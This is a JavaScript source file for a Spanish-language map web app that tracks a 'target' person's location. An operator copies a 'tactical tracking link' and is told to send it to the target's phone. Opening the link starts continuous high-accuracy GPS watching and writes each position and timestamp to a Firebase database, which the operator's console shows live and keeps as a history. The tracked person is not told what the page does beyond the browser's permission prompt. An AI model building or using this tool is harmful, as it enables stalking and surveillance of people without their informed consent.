import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { getFirestore, doc, setDoc, onSnapshot, collection, getDocs, query, orderBy } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

// --- CONFIGURA AQUÍ TUS CREDENCIALES DE FIREBASE ---
const firebaseConfig = {
    apiKey: "TU_API_KEY",
    authDomain: "tu-proyecto.firebaseapp.com",
    projectId: "tu-proyecto",
    storageBucket: "tu-proyecto.appspot.com",
    messagingSenderId: "TU_MESSAGING_SENDER_ID",
    appId: "TU_APP_ID"
};
// ---------------------------------------------------

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

let map;
let mainMarker;
let marcadoresAraña;
const ubicacionPorDefecto = [14.3333, -90.6667]; 

const urlParams = new URLSearchParams(window.location.search);
const targetId = urlParams.get('target');

document.addEventListener("DOMContentLoaded", function () {
    map = L.map('map', { zoomControl: false }).setView(ubicacionPorDefecto, 14);
    
    marcadoresAraña = L.layerGroup().addTo(map);

    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        maxZoom: 19,
        attribution: '&copy; OpenStreetMap contributors'
    }).addTo(map);

    mainMarker = L.marker(ubicacionPorDefecto, {
        zIndexOffset: 1000
    }).addTo(map).bindPopup("<b>Sistema centralizado.</b> Esperando señal...");

    setTimeout(() => { map.invalidateSize(); }, 200);

    if (targetId) {
        document.getElementById('banner-status').innerHTML = "TRANSMITIENDO SEÑAL<br>GPS ACTIVO...";
        iniciarTransmisionRemota(targetId);
    } else {
        document.getElementById('banner-status').innerHTML = "CONSOLA CENTRAL<br>CARGANDO HISTORIAL...";
        cargarPuntosHistoricos("objetivo_principal");
        escucharObjetivoEnTiempoReal("objetivo_principal");
    }
});

async function cargarPuntosHistoricos(id) {
    if (!marcadoresAraña) return;
    marcadoresAraña.clearLayers();

    try {
        const lecturasRef = collection(db, "rastreos", id, "lecturas");
        const q = query(lecturasRef, orderBy("timestamp", "asc"));
        const querySnapshot = await getDocs(q);
        
        let ultimaUbicacion = null;

        querySnapshot.forEach((docSnap) => {
            const data = docSnap.data();
            const lat = data.lat;
            const lng = data.lng;
            const timestamp = data.timestamp ? (typeof data.timestamp.toDate === 'function' ? data.timestamp.toDate() : new Date(data.timestamp)) : new Date();

            const spiderIcon = L.divIcon({
                html: '🕷️',
                className: 'spider-marker',
                iconSize: [24, 24],
                iconAnchor: [12, 12]
            });

            L.marker([lat, lng], { icon: spiderIcon })
                .addTo(marcadoresAraña)
                .bindPopup(`<b>Punto de Acceso</b><br>Hora: ${timestamp.toLocaleTimeString()}`);
            
            ultimaUbicacion = [lat, lng];
        });

        if (ultimaUbicacion) {
            map.fitBounds(marcadoresAraña.getBounds().pad(0.1));
            document.getElementById('banner-status').innerHTML = "HISTORIAL CARGADO<br>LISTO PARA OPERAR";
        } else {
            document.getElementById('banner-status').innerHTML = "SIN DATOS HISTÓRICOS<br>EN ESTE OBJETIVO";
        }
    } catch (e) {
        console.error("Error al cargar historial:", e);
    }
}

function escucharObjetivoEnTiempoReal(id) {
    onSnapshot(doc(db, "rastreos", id), (docSnap) => {
        if (docSnap.exists()) {
            const data = docSnap.data();
            const lat = data.lat;
            const lng = data.lng;

            map.setView([lat, lng], 16);
            mainMarker.setLatLng([lat, lng]);
            mainMarker.bindPopup(`<b>¡Objetivo Localizado!</b><br>Lat: ${lat.toFixed(4)}<br>Lng: ${lng.toFixed(4)}`).openPopup();
            
            document.getElementById('banner-status').innerHTML = "OBJETIVO ENLAZADO<br>SEÑAL ESTABLE";
        } else {
             document.getElementById('banner-status').innerHTML = "OBJETIVO DESCONECTADO<br>ESPERANDO CONEXIÓN";
        }
    });
}

window.compartirEnlace = function() {
    const baseUrl = "https://mmommo52.github.io/Spidey/";
    const enlaceObjetivo = `${baseUrl}?target=objetivo_principal`;
    
    navigator.clipboard.writeText(enlaceObjetivo).then(() => {
        alert("¡Enlace táctico de rastreo copiado!\nEnvíalo al celular objetivo.");
    }).catch(err => {
        console.error("Error al copiar enlace:", err);
    });
};

function iniciarTransmisionRemota(id) {
    if (!navigator.geolocation) { alert("Tu dispositivo no soporta geolocalización."); return; }

    navigator.geolocation.watchPosition(
        async (position) => {
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;
            const timestamp = new Date();

            try {
                const refPrincipal = doc(db, "rastreos", id);
                await setDoc(refPrincipal, { lat, lng, timestamp });

                const refHistorial = doc(collection(db, "rastreos", id, "lecturas"));
                await setDoc(refHistorial, { lat, lng, timestamp });
            } catch (e) {
                console.error("Error al escribir en la base de datos:", e);
            }
        },
        () => { alert("Error de GPS: Asegúrate de dar permisos de ubicación."); },
        { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
    );
}

window.obtenerUbicacionActual = function() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((pos) => {
            const lat = pos.coords.latitude;
            const lng = pos.coords.longitude;
            map.setView([lat, lng], 16);
            L.circleMarker([lat, lng], { radius: 10, color: 'blue', fillColor: 'blue', fillOpacity: 0.3 })
                .addTo(map)
                .bindPopup("Tu posición actual (Local)");
        });
    } else {
        alert("Geolocalización no soportada en este navegador.");
    }
};

window.centrarEnMiUbicacion = function() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((pos) => {
            const lat = pos.coords.latitude;
            const lng = pos.coords.longitude;
            map.setView([lat, lng], 17);
        }, () => {
             alert("No se pudo obtener tu ubicación.");
        }, { enableHighAccuracy: true });
    } else {
        alert("Geolocalización no soportada.");
    }
};

window.accionRastrearObjetivo = () => alert("Protocolo de rastreo activo. Esperando conexión del enlace...");
window.cambiarAlerta = (t) => alert("Alerta: " + t);
window.cambiarPerfil = (n) => alert("Perfil: " + n);
window.abrirChat = () => alert("Canal de chat seguro abierto.");
window.verArchivo = () => alert("Abriendo registros históricos...");
